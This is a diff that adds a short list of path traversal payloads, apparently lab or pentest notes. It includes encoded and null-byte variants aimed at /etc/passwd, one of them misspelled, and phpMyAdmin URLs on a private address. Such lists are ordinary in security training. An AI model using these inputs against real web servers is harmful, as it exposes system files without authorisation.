@@ -1,0 +1,7 @@
+/etc/passwd
+?path=imgs/w.jpg
+/image?filename=..%252f..%252f..%252fetc/passwd
+/var/www/images/../../../etc/passwd
+../../../etc/paswd%00.png
+http://192.168.2.157/phpmyadmin/index.php?route=/database/structure&db=elearning&lang=en
+http://192.168.2.157/phpmyadmin/
